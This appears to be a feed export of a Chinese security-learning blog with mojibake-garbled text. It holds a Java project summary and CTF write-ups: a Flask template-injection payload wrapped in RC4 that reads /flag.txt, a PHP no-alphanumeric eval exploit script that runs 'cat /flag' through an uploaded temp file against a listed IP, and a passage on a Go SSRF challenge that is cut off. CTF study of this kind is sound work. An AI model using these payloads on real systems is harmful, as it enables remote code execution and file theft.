    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>å®éªŒå®¤Javaé¡¹ç›®ï¼Œå­¦ä¹ å°ç»“</p><a id="more"></a><p>è¯è¯´è¿™æ˜¯ä¿¡æ¯å®‰å…¨å®éªŒå®¤çš„å¼€å‘é¡¹ç›®ï¼Œemmmâ€¦â€¦</p></blockquote><blockquote><p>å­¦ä¹ èµ„æº:<br><a href="https://www.bilibili.com/video/BV1CJ411m7gg">æ±‚çŸ¥è®²å ‚Javaè§†é¢‘</a> (98/120)</p><p><a href="https://www.bilibili.com/video/BV18s411u7EH">JavaWebè§†é¢‘æ•™ç¨‹</a> (31/68)</p><p><a href="https://www.bilibili.com/video/BV177411s7Lt">Electronå…è´¹è§†é¢‘æ•™ç¨‹-ä»åŸºç¡€åˆ°å®æˆ˜</a> (1/17)</p><p>å®Œï¼Œå†™å°ç»“çš„æ—¶å€™æ„Ÿè§‰çŸ¥è¯†å·²ç»å¼€å§‹å¿˜äº†â€¦â€¦ğŸ¤£</p></blockquote><blockquote><p><strong>æè¿°</strong>ï¼šç¾å®¹é™¢ç®¡ç†ç³»ç»Ÿ</p><p><strong>åˆæœŸç›®æ ‡</strong>ï¼šå®ç°å…¶ä¸­çš„å•†å“ç®¡ç†ç³»ç»Ÿï¼Œå³å¢ã€åˆ ã€æ”¹ã€æŸ¥</p></blockquote><h4><span id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†ï¼š</span></h4><p><strong>JavaåŸºæœ¬çŸ¥è¯†çš„å­¦ä¹ ï¼š</strong><a href="https://www.bilibili.com/video/BV1CJ411m7gg">æ±‚çŸ¥è®²å ‚Javaè§†é¢‘</a> (98/120)</p><ul><li>æƒ…å†µï¼šæŒæ¡äº†åŸºæœ¬çš„è¯­æ³•ï¼Œäº†è§£äº†ä¸€äº›è®¾è®¡æ¨¡å¼ï¼Œé¢å‘å¯¹è±¡ç¼–ç¨‹æ·±å…¥æˆ‘å¿ƒï¼Œè¿˜éœ€å­¦ä¹ é¢å‘æ¥å£ç¼–ç¨‹ï¼Œéœ€è¦å¤ä¹ â€¦â€¦</li></ul><p>ç­‰æˆ‘å­¦å®Œï¼Œæ•´ç†ä¸‹ç¬”è®°å‘å‡ºæ¥å§â€¦â€¦æŒºå¤šçš„</p><p><strong>JavawebçŸ¥è¯†å­¦ä¹ ï¼š</strong><a href="https://www.bilibili.com/video/BV18s411u7EH">JavaWebè§†é¢‘æ•™ç¨‹</a> (31/68)</p><ul><li>æƒ…å†µï¼šçº ç»“å¥½ä¹…ï¼Œå†³å®šä»jspå¼€å§‹ã€‚å­¦ä¹ äº†jspã€JavaBeanã€jdbcã€servletã€åŸºç¡€æ¶æ„çŸ¥è¯†ï¼›æœ¬æ¬¡é¡¹ç›®ä¹Ÿæ˜¯è·Ÿç€è§†é¢‘å­¦åˆ°ä¸€å®šç¨‹åº¦æ‰“å‡ºæ¥çš„â€¦â€¦</li></ul><p>ç›®å‰æ— ç¬”è®°â€¦â€¦æ‡’çˆ†â€¦â€¦æƒ³æŠŠJavaåŸºç¡€å…ˆæ•´å¥½</p><p><strong>sqlåŸºç¡€çŸ¥è¯†ï¼š</strong>æ— </p><ul><li>æƒ…å†µï¼šâ€¦â€¦åŠåŠå­ä¸å¦‚çš„æ°´å¹³ï¼ŒåŸºæœ¬äº†è§£ä¹Ÿæ˜¯å­¦ä¹ sqlæ³¨å…¥çš„æ—¶å€™çŸ¥é“çš„ï¼Œä¹Ÿæ¶‰åŠä¸åˆ°å¤æ‚sqlâ€¦â€¦åè€Œå®é™…çš„å¼€å‘è®©æˆ‘æ›´åŠ äº†è§£äº†æ™®é€šçš„æ³¨å…¥åœºæ™¯â€”â€”é¢„ç¼–è¯‘ğŸ˜‘</li></ul><p>æ›´åŠ æ— ç¬”è®°ï¼Œå­¦æ ¡è®¡ç§‘ä¸“ä¸šç”šè‡³æ— æ•°æ®åº“çš„è¯¾â€¦â€¦</p><p><strong>å‰ç«¯åŸºç¡€çŸ¥è¯†ï¼š</strong></p><ul><li>æƒ…å†µï¼šjså­¦è‰ºä¸ç²¾â€¦â€¦ä¹‹å‰çœ‹äº†åå‡ èŠ‚è¯¾ï¼Œå› æœ‰äº‹è€Œææµ…ï¼›cssä¹Ÿå­¦è‰ºä¸ç²¾â€¦â€¦ç›®å‰æ˜¯æ‰¾åˆ°ä¸é”™çš„æ¨¡æ¿ï¼Œå¯ä»¥å€ŸåŠ©æœç´¢å¼•æ“è¾¾åˆ°æˆ‘æƒ³è¦çš„æ•ˆæœâ€¦â€¦åˆšåˆšèƒ½çœ‹æ‡‚çš„æ°´å¹³ï¼Ÿ</li></ul><p>å®³â€¦â€¦</p><p><strong>Electronï¼Ÿ</strong></p><ul><li>æƒ…å†µï¼šåªæ˜¯ä¸ºäº†ä¾¿äºæµè§ˆæ‰¾åˆ°çš„å®¢æˆ·ç«¯åˆ¶ä½œå·¥å…·â€¦â€¦<strong>åªçœ‹äº†ä¸€é›†</strong>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œ<strong>jsçœŸå¿ƒnb</strong>ï¼Œæˆ‘è¦å¥½å¥½å­¦â€¦â€¦è¿˜æœ‰<strong>python</strong>â€¦â€¦æ„Ÿè§‰å­¦ä¸å®Œäº†ï¼Œæˆ‘è¿˜<strong>å¤©å¤©ç©</strong>ğŸ•</li></ul><p>ç©æ‰‹æœºâ€¦â€¦å˜¿å˜¿ğŸ¤¤</p><h4><span id="é¡¹ç›®ä»‹ç»">é¡¹ç›®ä»‹ç»</span></h4><blockquote><p>å¼€å‘å·¥å…·ï¼šeclipse</p><p>æœåŠ¡å™¨ï¼štomcat</p><p>servletï¼š3.0</p><p>æ•°æ®åº“ï¼šsqlite</p><p>æ¡Œé¢å®¢æˆ·ç«¯ï¼šElectron</p><p>æ¶æ„ï¼šâ€”â€”<strong>ä¸‰å±‚æ¶æ„</strong>ï¼š</p><p>â€‹                    â€“<strong>è¡¨ç¤ºå±‚</strong> ï¼š ã€å‰å°ã€‘ï¼šjspã€cssã€jsâ€¦â€¦ + ã€åå°ã€‘ï¼šservlet </p><p>â€‹                    â€“<strong>ä¸šåŠ¡é€»è¾‘å±‚</strong>ï¼š service</p><p>â€‹                    â€“<strong>æ•°æ®è®¿é—®å±‚</strong>ï¼š Dao</p><p>ç°æœ‰åŠŸèƒ½ï¼š-å¯¹å•†å“çš„å¢åˆ æ”¹æŸ¥</p><p>â€‹                    -ä»¥å•†å“ç¼–å·ä¸ºå”¯ä¸€ä¸»é”®è¿›è¡Œç»Ÿä¸€ç®¡ç†</p></blockquote><p><img src="/images/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/clip_image002.jpg" alt="img"></p><h3><span id="é¡¹ç›®éƒ¨ç½²">é¡¹ç›®éƒ¨ç½²</span></h3><p><img src="/images/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/image-20210815184343455.png" alt="image-20210815184343455"></p><ul><li>run.exeç”±test.vbsç¼–è¯‘è€Œæ¥</li><li>test.vbsæ— çª—å£è°ƒç”¨test.bat</li><li>batä¾æ¬¡è®¾ç½®ç¯å¢ƒå˜é‡ã€å¯åŠ¨tomcatã€å¯åŠ¨electron</li></ul><p>éƒ¨ç½²ç»†èŠ‚ï¼š</p><ul><li>é»˜è®¤æœåŠ¡å¼€åœ¨8888ç«¯å£</li><li>ä¼šåœ¨Dç›˜ä¸‹ç”Ÿæˆproject.dbä½œä¸ºæ•°æ®åº“</li><li>æœåŠ¡å…³é—­éœ€å…³é—­ javaw æœåŠ¡ ä¸ electron</li><li>æ¡ä»¶ç¬¦åˆè§£å‹åå³å¯ä½¿ç”¨</li></ul><h4><span id="é¡¹ç›®åˆæœŸæ¼”ç¤º">é¡¹ç›®åˆæœŸæ¼”ç¤º</span></h4><div style="width:100%;height:0px;position:relative;padding-bottom:56.327%;"><iframe src="https://streamja.com/embed/JLP6G" frameborder="0" width="100%" height="100%" allowfullscreen style="width:100%;height:100%;position:absolute;"></iframe></div><blockquote><p>qqå½•å±æ ¼å¼ä¸å¯¹ï¼Œç”±ç¢°ä¸Šæ–­ç½‘â€¦â€¦æ•´äº†è€åŠå¤©â€¦â€¦æ— è¯­</p><p>æƒ³ç”¨ä¸ƒç‰›äº‘åšä¸ªå›¾åºŠï¼Œç»“æœè¦å¤‡æ¡ˆåŸŸåï¼Œè‡³å°‘è¦ä¸ƒå¤©â€¦â€¦ å…è´¹å›¾åºŠ+streamjaå°±æŒºé¦™çš„ï¼Œä¸çŸ¥é“è´¹åŠå¤©åŠ²å¹²ä»€ä¹ˆğŸ™„</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;å®éªŒå®¤Javaé¡¹ç›®ï¼Œå­¦ä¹ å°ç»“&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019-åä¸œå—èµ›åŒº-Double-Secret</title>
    <link href="http://example.com/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
    <id>http://example.com/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</id>
    <published>2021-05-14T06:28:06.000Z</published>
    <updated>2021-08-23T08:05:36.036Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="ciscn2019-åä¸œå—èµ›åŒºdouble-secret">[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</span></h3><p>Welcome To Find Secret</p><p>è®°å½•ä¸€ä¸‹â€¦â€¦</p><p>å¯»æ‰¾secretâ€¦â€¦æ‰«ä¸å‡ºåå°ï¼Œrobotsé¡µé¢ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨â€¦â€¦</p><p>å°è¯•å‘ç°secreté¡µé¢ï¼š</p><img src="/images/CISCN2019-åä¸œå—èµ›åŒº-Double-Secret/image-20210514143307636.png" alt="image-20210514143307636" style="zoom:80%;"><p>æäº¤å‚æ•°secretï¼š</p><p>éšä¾¿è¾“å…¥æŠ¥é”™ï¼š</p><img src="/images/CISCN2019-åä¸œå—èµ›åŒº-Double-Secret/image-20210514143408872.png" alt="image-20210514143408872" style="zoom:80%;"><p>rc4ä¼¼ä¹æ˜¯éœ€è¦å¯†é’¥çš„ä¸€ç§åŠ å¯†ï¼ŒçŒœæµ‹æ­¤å¤„æš´æ¼äº†å¯†é’¥</p><p>å¹¶ä¸”è§£å¯†åè¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œflaskï¼Œæ¨¡æ¿æ³¨å…¥â€¦â€¦</p><p>è®°å½•ä¸‹è„šæœ¬ä¸ç”¨æ³•â€¦â€¦æœ¬åœ°æŠ¥é”™ï¼Œæäº†å¥½é•¿æ—¶é—´ï¼Œè¾“å‡ºåˆä¸å¯¹</p><p>æ‹‰åˆ°kaliä¸­ï¼Œå®‰è£…python3å¯ä»¥è¿è¡Œâ€¦â€¦å¾ˆè¿·â€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯</span></span><br><span class="line">    <span class="comment"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210514143837632.png" alt="image-20210514143837632"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;ciscn2019-åä¸œå—èµ›åŒºdouble-secret&quot;&gt;[CISCN2019 åä¸œå—èµ›åŒº]Double Secret&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;Welcome To Find Secret&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹â€¦â€¦&lt;/p&gt;
&lt;p&gt;å¯»æ‰¾secre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ´¥é—¨æ¯hate_php</title>
    <link href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/"/>
    <id>http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/</id>
    <published>2021-05-12T12:59:43.000Z</published>
    <updated>2021-05-12T13:06:29.837Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="æ´¥é—¨æ¯hate_php">æ´¥é—¨æ¯hate_php</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>pç¥ï¼</strong>ï¼š<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p><p>å¯ä»¥åœ¨resä¸­çœ‹åˆ°phpç‰ˆæœ¬ä¸º5.xï¼Œè¿™é‡Œå°±éœ€è¦ç”¨åˆ°pç¥çš„php5ä¸‹çš„ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶+é€šé…ç¬¦RCE</p><blockquote><p>å¤šè¿‡æ»¤ä¸€ä¸ª@ï¼Œçœ‹ç€asciiå¾€å‰æ¢ä¸€ä¸ªå°±è¡Œ</p></blockquote><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://122.112.214.101:20004/index.php?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url=url,files=files)</span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><blockquote><p>æœ‰ä¸€å®šæ¦‚ç‡æ€§â€¦â€¦</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;æ´¥é—¨æ¯hate_php&quot;&gt;æ´¥é—¨æ¯hate_php&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/spa</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ´¥é—¨æ¯GoOSS</title>
    <link href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/"/>
    <id>http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/</id>
    <published>2021-05-12T11:51:48.000Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="æ´¥é—¨æ¯gooss">æ´¥é—¨æ¯GoOSS</span></h3><blockquote><p>å¼„æ‡‚è¿™é“é¢˜èŠ±äº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼ŒæœŸé—´èµ°äº†å¾ˆå¤šå¼¯è·¯â€¦â€¦ï¼ˆ<strong>wotaicaile</strong></p><p>åœ¨å†™è¿™é“é¢˜çš„è·¯ä¸Šï¼Œæˆ‘å­¦ä¹ (äº†è§£)äº†DNSç»‘å®šæ”»å‡»ã€Googleè´¦å·éªŒè¯ã€å…è´¹åŸŸåæ³¨å†Œ(ç™½å«–)ã€golangã€æ­å»ºgoç¯å¢ƒã€ginã€dlvè°ƒè¯•golangâ€¦â€¦</p></blockquote><h4><span id="ginä»£ç ">ginä»£ç </span></h4><p>åœ¨goç¨‹åºæœ€å‰å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>&quot;github.com/gin-gonic/gin&quot;</code>æ—¢æ˜¯ginæ¡†æ¶ï¼Œæ‰€ä»¥æ—¢è¦çœ‹å¾—æ‡‚goï¼Œä¹Ÿè¦å­¦çœ‹ginâ€¦â€¦</p><p>è·¯ç”±ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.Use(fileMidderware)</span><br><span class="line">r.POST(<span class="string">&quot;/vul&quot;</span>, vulController)</span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, uploadController)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">_ = r.Run(<span class="string">&quot;:1234&quot;</span>) <span class="comment">// listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>r.Use(fileMidderware)</code>è®¾ç½®äº†å…¨å±€ä¸­é—´ä»¶</p><p><code>r.POST(&quot;/vul&quot;, vulController)</code>è®¾ç½®äº†å¯¹è¯¥è·¯å¾„è¯·æ±‚çš„å±€éƒ¨ä¸­é—´ä»¶</p><p>vulControllerï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url Url</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;url); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ†ç»‘urlä¸ºjsonæ ¼å¼ï¼Œpostä¼ å‚æ—¶éœ€è¦ä¼ ï¼š<code>&#123;&quot;url&quot;:&quot;xxxx&quot;&#125;</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasPrefix(url.Url, <span class="string">&quot;http://127.0.0.1:1234/&quot;</span>) &#123;</span><br><span class="line">c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;url forbidden&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">client := &amp;http.Client&#123;Timeout: <span class="number">2</span> * time.Second&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">resp, err := client.Get(url.Url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†å†…ç½‘è®¿é—®çš„ç«¯å£</p><p>uploadControllerï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file File</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;file); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dir := md5sum(file.Name)</span><br><span class="line"></span><br><span class="line">_, err := http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">e := os.Mkdir(<span class="string">&quot;./files/&quot;</span>+dir, os.ModePerm)</span><br><span class="line">_, _ = http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: e.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">filename := md5sum(file.Content)</span><br><span class="line">path := <span class="string">&quot;./files/&quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename</span><br><span class="line">err = ioutil.WriteFile(path, []<span class="keyword">byte</span>(file.Content), os.ModePerm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;file upload succ, path: &quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ˜¯åœ¨filesæ–‡ä»¶å¤¹ä¸‹ä¸Šä¼ 